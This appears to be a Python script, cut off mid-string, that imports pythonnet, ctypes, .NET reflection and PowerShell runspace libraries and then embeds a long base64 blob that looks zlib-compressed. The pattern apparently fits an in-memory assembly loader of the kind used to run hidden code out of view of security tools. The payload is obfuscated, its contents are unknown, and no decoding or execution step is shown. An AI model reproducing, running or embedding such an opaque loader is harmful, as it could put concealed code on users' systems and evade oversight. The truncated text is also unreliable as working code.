import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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